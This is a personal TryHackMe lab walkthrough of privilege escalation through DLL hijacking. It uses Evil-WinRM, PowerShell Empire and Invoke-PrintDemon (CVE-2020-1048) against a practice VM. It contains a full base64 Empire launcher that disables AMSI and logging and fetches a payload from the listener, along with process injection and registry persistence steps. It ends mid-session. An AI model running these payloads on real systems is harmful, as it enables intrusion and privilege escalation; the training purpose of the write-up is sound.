<h1 align="center">DLL Hijacking</h1>
<p align="center">2025, Sepetember 17<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>499</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>DLL HIJACKING with Invoke-PrintDemon</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/68c7ee07-537b-4bd9-a0a9-7bfa4f17df73"><br>
Access this walkthrough room clicking <a href="https://tryhackme.com/room/dllhijacking">here </a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/debf9d44-0019-44da-9ffb-f6f6e6ff37f2"></p>

<br>
<h2>Task 1 . Overview of DLL Hijacking</h2>
<p>Invoke-PrintDemon takes advantage of two different vulnerabilities: Faxhell and PrintDemon. The first is a DLL hijack of the ualapi DLL when the fax service is running (Faxhell).</p>

<p><code>DLL hijacking</code> vulnerabilities happen when a program attempts to load a DLL from a location and can’t find it. As shown above, the fax service can’t find the <code>ualapi</code> DLL when it tries to load it. The fax service runs as <code>SYSTEM</code>, so any code executed from the DLL will run in an elevated context. However, we need to write to the privileged folder <code>C:\Windows\System32</code> to hijack the DLL. </p>

<img width="624" height="331" alt="image" src="https://github.com/user-attachments/assets/cb37cad6-7c7d-4d6f-81ae-960ddb1eed35" />

<p><code>CVE-2020-1048</code> allows us to arbitrarily write to anywhere on disk. The linked post about vulnerability is a bit obtuse but works because of three primary concepts.<br>

- A printer port does not have to be an actual port but instead can be a file location. Think about how you can print files to PDF. This still runs through a "printer port" but writes to a file.<br>
- The Print Spooler service creates a shadow job file so that printer can recover the job in case of an unexpected interruption of the service.<br>
- When a print job is started, it inherits the privilege of the user requesting the job.<br><br>
So initially, when we request a print job, it only has our standard user permissions. However, the shadow job file has no user context attached to it. This means that when the Print Spooler service is restarted and initiates a job from the shadow file and inherits the Print Spooler service's permissions, which is running as <code>SYSTEM</code>!<br>

That's a lot of complicated things being explained in a short paragraph, so the key takeaway is that <code>CVE-2020-1048</code> allows us to tell Print Spooler to write to any arbitrary file. As long as we can restart the Spooler service, we will have the necessary permissions even as a low-level user. Luckily, print jobs survive restarts, and restarting the computer is allowed by any user.</p>

<p><em>Answer the questions below</em></p>

<p>1.1. Read the above<br>
<code>No answer needed</code></p>

<p>1.2 Deploy DLL Hijacking VM<br>
<code>No answer needed</code></p>

<h2>Task 2 . Install Tools</h2>
<h3>Using the Attackbox</h3>
<p>The rest of this task is provided as a reference. Follow these instructions only if you plan to install Empire on your machine. Both Empire and evil-winrm are already installed and available in the AttackBox for your use.<br>

The Empire installation on the Attackbox is dockerized for convenience. To use Empire from the attackbox, just run the following command:</p>

```bash
user@attackbox$ docker run --network host -it --volumes-from empirestorage bcsecurity/empire:v3.5.2 ./empire
```

<p>Evil-winrm can be used just as any other Linux command by following the instructions in the following tasks.<br>

If you decide against using the Attackbox, the instructions to install both tools follow.</p>

<h3>Empire</h3>
<p>Empire 3 is a post-exploitation framework that includes a pure-PowerShell Windows agent, and compatibility with Python 3.x Linux/OS X agents. It is the merger of the previous PowerShell Empire and Python EmPyre projects. The framework offers cryptologically-secure communications and flexible architecture.</p>

<img width="657" height="361" alt="image" src="https://github.com/user-attachments/assets/d2305ff2-57b2-49b2-8761-31d5c42e72c1" />

<h3>Install Instructions</h3>
<h4>Kali</h4>
<p>

- <code>sudo apt install powershell-empire</code></p>


<h4>GitHub</h4>
<p>

- <code>git clone https://github.com/BC-SECURITY/Empire.git</code><br>
- <code>cd Empire</code><br>
- <code>sudo ./setup/install.sh</code></p>

<p>Alternatively, install instructions for Docker and Poetry are on the Empire Github.</p>

<h3>Evil-WinRM</h3>
<p>WinRM (Windows Remote Management) is the Microsoft implementation of the WS-Management Protocol. A standard SOAP-based protocol that allows hardware and operating systems from different vendors to interoperate. Microsoft included it in their Operating Systems in order to make life easier for system administrators. Evil-WinRM is the ultimate WinRM shell for hacking/pentesting.</p>

<p>

- <code>git clone https://github.com/Hackplayers/evil-winrm.git</code><br>
- <code>cd evil-winrm</code><br>
- <code>gem install evil-winrm</code></p>

<p><em>Answer the question below</em></p>

<p>2.1. Empire and Evil-WinRM successfully installed<br>
<code>No answer needed</code></p>

```bash
:~/DLLHijacking# docker run --network host -it --volumes-from empirestorage bcsecurity/empire:v3.5.2 ./empire
...
================================================================================
 [Empire]  Post-Exploitation Framework
================================================================================
 [Version] 3.5.2 BC Security Fork | [Web] https://github.com/BC-SECURITY/Empire
================================================================================
 [Starkiller] Multi-User GUI | [Web] https://github.com/BC-SECURITY/Starkiller
================================================================================

   _______ .___  ___. .______    __  .______       _______
  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|
  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__
  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|
  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____
  |_______||__|  |__| | _|      |__| | _| `._____||_______|


       312 modules currently loaded

       0 listeners currently active

       0 agents currently active


(Empire) > 
```

```bash
:~/DLLHijacking# evil-winrm -h
                                        
Evil-WinRM shell v3.7

Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-a USERAGENT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]
    -S, --ssl                        Enable ssl
    -a, --user-agent USERAGENT       Specify connection user-agent (default Microsoft WinRM Client)
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
    -e, --executables EXES_PATH      C# executables local path
    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
    -U, --url URL                    Remote url endpoint (default /wsman)
    -u, --user USER                  Username (required if not using kerberos)
    -p, --password PASS              Password
    -H, --hash HASH                  NTHash
    -P, --port PORT                  Remote host port (default 5985)
    -V, --version                    Show version
    -n, --no-colors                  Disable colors
    -N, --no-rpath-completion        Disable remote path completion
    -l, --log                        Log the WinRM session
    -h, --help                       Display this help message
```

<img width="1760" height="830" alt="image" src="https://github.com/user-attachments/assets/9e2bf6ee-505b-405a-9410-15bea30d0b17" />

<br>
<h2>Task 3 . Windows Remote Management (WinRM)</h2>
<p>Windows Remote Management (WinRM) can be used to login to a user-level account. A few methods exist to deploy an Empire agent, we recommend using Evil-WinRM to connect to the target box and then drop-in a multi/launcher to Evil-WinRM session. (We will go over how to build the launcher in the next few tasks).</p>

<img width="472" height="146" alt="image" src="https://github.com/user-attachments/assets/5fd67b35-2221-4958-808f-c60f9f185bd4" />

<p>

- <code>evil-winrm -i <IP_ADDRESS> -u <USERNAME></code></p>

<p><strong>Login</strong>: ***<br>
<strong>Password</strong>: ******************</p>


<p><em>Answer the question below</em></p>

<p>3.1. Successfully connected to the DLL Hijacking VM with Evil-WinRM.<br>
<code>No answer needed</code></p>

```bash
:~/DLLHijacking# evil-winrm -i xx.xxx.xx.xx -u ***
Enter Password: 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Sam\Documents> 
```

<h2>Task 4 . Launch Empire Agent</h2>
<p>To create an Empire listener, run the following:<br>

- <code>uselistener http</code><br>
- <code>set Host [Host IP]</code><br> 
- <code>set Port [Port Number]</code><br>
- <code>execute</code></p>

<img width="675" height="200" alt="image" src="https://github.com/user-attachments/assets/6316dbf1-d0c9-4edd-af7b-b48ca7295c5b" />

<p>Return to the main menu by typing main and create an Empire stage:<br>

- <code>usestager multi/launcher</code><br>
- <code>set Listener http</code><br>
- <code>execute</code></p>

<img width="1008" height="407" alt="image" src="https://github.com/user-attachments/assets/ec94007e-a9dd-47bf-9a4f-9b07277f139a" />

<p><em>Note: Because of this being a walkthrough box on using Invoke-Printdemon, we have disabled Windows Defender, and there is no need to worry about obfuscation.</em></p>

<p>If you want to learn more about Empire, please check out the PS Empire room or the BC Security blog for more information.</p>


<p><em>Answer the questions below</em></p>

<p>4.1. Created HTTP Listener<br>
<code>No answer needed</code></p>

```bash
================================================================================
 [Empire]  Post-Exploitation Framework
================================================================================
 [Version] 3.5.2 BC Security Fork | [Web] https://github.com/BC-SECURITY/Empire
================================================================================
 [Starkiller] Multi-User GUI | [Web] https://github.com/BC-SECURITY/Starkiller
================================================================================

   _______ .___  ___. .______    __  .______       _______
  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|
  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__
  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|
  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____
  |_______||__|  |__| | _|      |__| | _| `._____||_______|


       312 modules currently loaded

       0 listeners currently active

       0 agents currently active


(Empire) > uselistener http
(Empire: listeners/http) > set Port 495
(Empire: listeners/http) > set Host xx.xxx.xx.xx
(Empire: listeners/http) > execute
[*] Starting listener 'http'
 * Serving Flask app "http" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
[+] Listener successfully started!
(Empire: listeners/http) > 
```

<img width="1756" height="615" alt="image" src="https://github.com/user-attachments/assets/7a11b0a2-0b82-4fbf-bd33-c4ccd59f4294" />

<br>
<p>4.2. Generated Multi/Launcher Stager<br>
<code>No answer needed</code></p>

```bash
(Empire: listeners/http) > main
```

```bash
================================================================================
 [Empire]  Post-Exploitation Framework
================================================================================
 [Version] 3.5.2 BC Security Fork | [Web] https://github.com/BC-SECURITY/Empire
================================================================================
 [Starkiller] Multi-User GUI | [Web] https://github.com/BC-SECURITY/Starkiller
================================================================================

   _______ .___  ___. .______    __  .______       _______
  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|
  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__
  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|
  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____
  |_______||__|  |__| | _|      |__| | _| `._____||_______|


       312 modules currently loaded

       1 listeners currently active

       0 agents currently active


(Empire) > usestager multi/launcher
(Empire: stager/multi/launcher) > set Listener http
(Empire: stager/multi/launcher) > execute
powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAFIAcwBpAG8AbgBUAEEAQgBMAEUALgBQAFMAVgBFAHIAcwBJAG8ATgAuAE0AQQBqAE8AUgAgAC0AZwBlACAAMwApAHsAJABjADYANwA9AFsAUgBlAEYAXQAuAEEAcwBTAEUATQBiAGwAWQAuAEcAZQBUAFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAdABGAEkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABjADYANwApAHsAJAA2AGMANAA9ACQAYwA2ADcALgBHAEUAdABWAGEAbAB1AEUAKAAkAE4AdQBMAEwAKQA7AEkARgAoACQANgBDADQAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJAA2AEMANABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA2AEMANABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAFYAYQBMAD0AWwBDAE8AbABMAGUAQwBUAEkATwBOAFMALgBHAEUATgBFAHIASQBDAC4ARABJAGMAdABpAG8ATgBhAFIAWQBbAFMAVABSAGkAbgBnACwAUwBZAHMAdABFAE0ALgBPAEIAagBFAEMAVABdAF0AOgA6AE4ARQBXACgAKQA7ACQAVgBBAEwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBBAEwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAA2AEMANABbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJAB2AGEAbAB9AEUATABzAGUAewBbAFMAYwBSAEkAUABUAEIATABvAGMAawBdAC4AIgBHAGUAdABGAEkARQBgAGwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAFQAVgBhAEwAVQBlACgAJABuAFUAbABMACwAKABOAGUAdwAtAE8AQgBKAEUAYwB0ACAAQwBPAGwAbABlAEMAdABJAE8ATgBTAC4ARwBFAG4AZQByAGkAYwAuAEgAQQBzAGgAUwBlAFQAWwBzAHQAUgBJAG4ARwBdACkAKQB9ACQAUgBlAGYAPQBbAFIAZQBGAF0ALgBBAFMAcwBFAG0AQgBMAHkALgBHAEUAVABUAFkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQAnACsAJwBVAHQAaQBsAHMAJwApADsAJABSAGUAZgAuAEcAZQBUAEYASQBlAEwARAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAJwArACcAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAFQAVgBBAGwAdQBFACgAJABuAHUAbABsACwAJAB0AHIAVQBlACkAOwB9ADsAWwBTAHkAcwBUAEUATQAuAE4AZQB0AC4AUwBlAFIAVgBpAGMARQBQAG8AaQBOAHQATQBhAE4AQQBnAEUAUgBdADoAOgBFAFgAUABlAEMAVAAxADAAMABDAG8AbgB0AEkATgBVAGUAPQAwADsAJABCAGEAMAA9AE4ARQB3AC0ATwBCAEoARQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQBUAC4AVwBFAGIAQwBMAGkARQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AHQALgBFAG4AQwBvAEQAaQBuAEcAXQA6ADoAVQBuAEkAYwBPAGQARQAuAEcAZQB0AFMAdABSAGkAbgBnACgAWwBDAG8ATgB2AGUAUgBUAF0AOgA6AEYAcgBvAE0AQgBBAFMARQA2ADQAUwB0AHIASQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHkAQQBEAEEAQQBNAFEAQQB1AEEARABJAEEATwBBAEEAdQBBAEQASQBBAE0AQQBBAHoAQQBEAG8AQQBOAEEAQQAwAEEARABVAEEAJwApACkAKQA7ACQAdAA9ACcALwBhAGQAbQBpAG4ALwBnAGUAdAAuAHAAaABwACcAOwAkAGIAYQAwAC4ASABFAEEAZABlAHIAcwAuAEEARABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAQgBhADAALgBQAHIAbwB4AFkAPQBbAFMAeQBzAFQAZQBtAC4ATgBlAHQALgBXAEUAYgBSAEUAcQB1AEUAUwBUAF0AOgA6AEQARQBmAEEAVQBsAFQAVwBlAGIAUAByAG8AeAB5ADsAJABCAGEAMAAuAFAAcgBPAFgAWQAuAEMAUgBlAEQAZQBuAFQAaQBhAEwAcwAgAD0AIABbAFMAeQBTAHQAZQBtAC4ATgBFAHQALgBDAFIARQBEAGUATgB0AEkAQQBsAEMAQQBDAEgAZQBdADoAOgBEAGUAZgBhAFUATAB0AE4AZQB0AHcATwByAGsAQwBSAGUARABlAE4AVABpAEEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAGIAYQAwAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAFkAUwB0AEUAbQAuAFQAZQBYAHQALgBFAE4AQwBPAGQASQBuAEcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQARQBzACgAJwBhAHcAWABVAEQAawBpAHQAPABvAFYAOQBKAGMAUgBPAEwAewAlAGcAUQAuAHwAMwBuAEgAcQBNAHAAQQAvAGwAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBHAFMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AVQBOAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgBYAE8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABiAEEAMAAuAEgAZQBBAEQAZQBSAFMALgBBAEQARAAoACIAQwBvAG8AawBpAGUAIgAsACIAdwBIAG4AZABGAFcAdwBYAD0AQQBlADMAVABSADkAYgBhAGwAcgAyAGMAawBaAGEAKwBmADkASABuAGkASwAzAC8AQQBqAGMAPQAiACkAOwAkAEQAYQB0AEEAPQAkAEIAQQAwAC4ARABPAFcATgBMAE8AQQBEAEQAYQBUAEEAKAAkAFMAZQByACsAJABUACkAOwAkAGkAdgA9ACQAZABhAHQAYQBbADAALgAuADMAXQA7ACQAZABBAFQAQQA9ACQAZABhAFQAQQBbADQALgAuACQAZABhAHQAQQAuAGwAZQBuAGcAVABoAF0AOwAtAGoAbwBJAG4AWwBDAGgAQQBSAFsAXQBdACgAJgAgACQAUgAgACQAZABBAFQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA
(Empire: stager/multi/launcher) > 
```

<img width="1761" height="834" alt="image" src="https://github.com/user-attachments/assets/a5cff3b8-654f-4bc0-9db3-4cba79c293bd" />

<br>
<h2>Task 5 . Deploy and Agent</h2>
<p>Evil-WinRM provides access to a PowerShell prompt for launching commands. This gives a few different options for delivering your payload (e.g., bat, exe, wget). You can choose whichever one you want, otherwise, the simplest solution is to launch the one-liner directly in the Evil-WinRM window.</p>

<p>

- <code>powershell -noP -sta -w 1 -enc XXXXXXXX</code></p>

<img width="850" height="322" alt="image" src="https://github.com/user-attachments/assets/2108eed1-d494-4c23-88ad-0fbfe05fa96f" />

<p>This should cause the agent to connect back to Empire, showing the following lines in your Empire console:</p>

```bash
[*] Sending POWERSHELL stager (stage 1) to xx.xx.xxx.xx
[*] New agent N3ELF241 checked in
[+] Initial agent N3ELF241 from xx.xx.xxx.xx now active (Slack)
[*] Sending agent (stage 2) to N3ELF241 at xx.xx.xxx.xx
```

<p>To interact with the agent, you need to run the following commands, replacing the corresponding agent name on the second command:<br>

- <code>agents</code><br>
- <code>interact N3ELF241</code></p>

<p><em>Answer the question below</em></p>

<p>5.1. Stager successfully calls back to Empire from Evil-WinRM<br>
<code>No answer needed</code></p>

```bash
Evil-WinRM* PS C:\Users\Sam\Documents> powershell -noP -sta -w 1 -enc  SQBG...
```

```bash
(Empire: stager/multi/launcher) > 
[*] Sending POWERSHELL stager (stage 1) to xx.xxx.xx.xx
[*] New agent 32H68BSD checked in
[+] Initial agent 32H68BSD from xx.xxx.xx.xx now active (Slack)
[*] Sending agent (stage 2) to 32H68BSD at xx.xxx.xx.xx
```

<img width="1754" height="830" alt="image" src="https://github.com/user-attachments/assets/b0734520-ee48-4fc7-bc7e-a685d0db380a" />

<br>
<br>

<img width="1763" height="832" alt="image" src="https://github.com/user-attachments/assets/8fcc8a6f-d38d-47f6-a318-9fab223c6e3a" />


<br>
<h2>Task 6 . Spawn as a New Process</h2>
<p>The session launched from Evil-WinRM has limitations with PowerShell. You will need to spawn a new process with Empire to be able to continue with the exercise. First, find a new process to migrate to using <code>Get-Process</code> (aliased as ps). Typically you will want to aim for a common process that is stable and won't be closed by a used (e.g., explorer).</p>
<p>

- <code>ps</code><br>

<img width="441" height="432" alt="image" src="https://github.com/user-attachments/assets/94e876ba-3f80-4f13-be91-d87bbfdc353d" /><br>

- After you have selected a process, you will execute <code>psinject <listenername> <processid></code> which will launch a new agent that is running locally and not through a remote session.

</p>

<img width="568" height="180" alt="image" src="https://github.com/user-attachments/assets/6467271f-ecf5-4dcc-9fec-34ddd24b6b54" />

<p><em>Answer the question below</em></p>

<p>6.1. Which process may work with psinject?. Hint : This process is the user shell, which we see as the familiar taskbar, desktop, and other user interface features.<br>
<code>No answer needed</code></p>

```bash
Empire: stager/multi/launcher) > agents

[*] Active agents:

 Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
 ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
 32H68BSD ps 0.0.0.0         DESKTOP-E920628   DESKTOP-E920628\Sam     powershell         4976   5/0.0    2025-09-17 xx:xx:xx  http    
```

<img width="1120" height="185" alt="image" src="https://github.com/user-attachments/assets/7327b2ce-0267-44d7-a83c-c6c640dda596" />

<br>
<br>

```bash
(Empire: agents) > interact 32H68BSD
(Empire: 32H68BSD) > 
```

<img width="1119" height="97" alt="image" src="https://github.com/user-attachments/assets/3b371a9a-a174-4104-a30f-40b9ca76a01b" />

<br>
<br>

```bash
(Empire: 32H68BSD) > ps
[*] Tasked 32H68BSD to run TASK_SHELL
[*] Agent 32H68BSD tasked with task ID 1
(Empire: 32H68BSD) >
...
```

```bash
Empire: 32H68BSD) > psinject http explorer
[*] Tasked 32H68BSD to run TASK_CMD_JOB
[*] Agent 32H68BSD tasked with task ID 2
[*] Tasked agent 32H68BSD to run module powershell/management/psinject
```

<br>

<h2>Task 7 . System Check</h2>

<img width="667" height="130" alt="image" src="https://github.com/user-attachments/assets/265bd05a-78db-4c95-8ded-81fc56552b0f" />

<p>Now that we have established a safe foothold, we want to obtain higher-level privileges.  CVE-2020-1048 means that unpatched systems prior to Windows build 2004 are vulnerable to arbitrary write anywhere vulnerability and DLL hijack through printer abuse.<br>

Check the Windows build number:<br>

- <code>shell Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Name ReleaseId</code><br>


If the build is less than a Windows 10 Build 2004, then try using the Invoke-Printdemon module in Empire.</p>


<p><em>Answer the question below</em></p>

<p>7.1. Successfully created print job and wrote launcher using Invoke-PrintDemon<br>
<code>No answer needed</code></p>

```bash
*Evil-WinRM* PS C:\Users\Sam\Documents> Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Name ReleaseId


ReleaseId    : 1903
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT
PSChildName  : CurrentVersion
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

```bash
*Evil-WinRM* PS C:\Users\Sam\Documents> (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').ReleaseId
 
 
1903
```

<img width="1216" height="290" alt="image" src="https://github.com/user-attachments/assets/fc2bac58-a82f-4a03-89f3-2ac395bbc3ca" />


<br>
<h2>Task 8 . Invoke-PrintDemon</h2>

<p><code>Invoke-PrintDemon</code> is a PowerShell Empire implementation PoC using <code>PrintDemon</code> and <code>Faxhell</code>. The module has the Faxhell DLL already embedded, which leverages <code>CVE-2020-1048</code> for privilege escalation. The vulnerability allows an unprivileged user to gain system-level privileges through Windows Print Spooler. The module prints a DLL named ualapi.dll, which is loaded to System32. The module then places a launcher in the registry, which executes code as SYSTEM on restart.</p>

<img width="756" height="607" alt="image" src="https://github.com/user-attachments/assets/db5e35f4-3315-4a57-b949-9a9eb649e1a2" />

<p><em>Note: You will need to use the Base64 encoded launcher to run Invoke-PrintDemon.</em></p>

<img width="1495" height="502" alt="image" src="https://github.com/user-attachments/assets/3c06544b-42a5-428b-975f-7285a6142711" />


<p>
  
- <code>usemodule privesc/printdemon</code><br>
- <code>set LauncherCode <Base64 Encoded Launcher></code><br>
- <code>execute</code><br><br>

If Invoke-PrintDemon was successful, you will receive the following messages. In the next section, you will restart the machine since the launcher is written to the registry for persistence. </p>

<img width="567" height="162" alt="image" src="https://github.com/user-attachments/assets/28c08f6b-4d7e-42e7-aad6-fd6e2bed6c2f" />


<p><em>Answer the question below</em></p>

<p>8.1. Successfully created print job and wrote launcher using Invoke-PrintDemon<br>
<code>No answer needed</code></p>

```bash
(Empire: powershell/privesc/printdemon) > info

              Name: Get Group Policy Preferences
            Module: powershell/privesc/printdemon
        NeedsAdmin: False
         OpsecSafe: False
          Language: powershell
MinLanguageVersion: 5
        Background: False
   OutputExtension: None

Authors:
  @hubbl3
  @Cx01N

Description:
  This is an Empire launcher PoC using PrintDemon, the
  CVE-2020-1048 is a privilege escalation vulnerability that
  allows a persistent threat through Windows Print Spooler.
  The vulnerability allows an unprivileged user to gain
  system-level privileges. Based on @ionescu007 PoC. The
  module prints a dll named ualapi.dll which is loaded to
  System32. The module then places a launcher in the registry
  which executes code as system on restart.

Comments:
  https://github.com/BC-SECURITY/Invoke-PrintDemon

Options:

  Name         Required    Value                     Description
  ----         --------    -------                   -----------
  Agent        True        32H68BSD                  Agent to run on.                        
  LauncherCode True                                  Base64 launcher code                    
  PrinterName  False                                 Optional name for the registered printer

(Empire: powershell/privesc/printdemon) > 
```

```bash
(Empire) > usestager multi/launcher
(Empire: stager/multi/launcher) > set Listener http
(Empire: stager/multi/launcher) > execute
powershell -noP -sta -w 1 -enc  SQBGACgAJAB....
(Empire: stager/multi/launcher) > 
[*] Sending POWERSHELL stager (stage 1) to xx.xxx.xx.xx
[*] New agent BXZN97UL checked in
(Empire: stager/multi/launcher) > [+] Initial agent BXZN97UL from xx.xxx.xx.xx now active (Slack)
[*] Sending agent (stage 2) to BXZN97UL at xx.xxx.xx.xx
(Empire: stager/multi/launcher) > 
```

```bash
main
```

```bash
(Empire) > agents

[*] Active agents:

 Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
 ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
 32H68BSD ps 0.0.0.0         DESKTOP-E920628   DESKTOP-E920628\Sam     powershell         4976   5/0.0    2025-09-17 xx:xx:xx  http            
 BXZN97UL ps 0.0.0.0         DESKTOP-E920628   DESKTOP-E920628\Sam     powershell         3608   5/0.0    2025-09-18 xx:xx:xx  http   
```

```bash
(Empire: agents) > interact BXZN97UL
(Empire: BXZN97UL) > usemodule privesc/printdemon
(Empire: powershell/privesc/printdemon) > set LauncherCode ....
(Empire: powershell/privesc/printdemon) > execute
```

```bash
:~/DLLHijacking# evil-winrm -i TargetIP -u Sam
Enter Password: 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
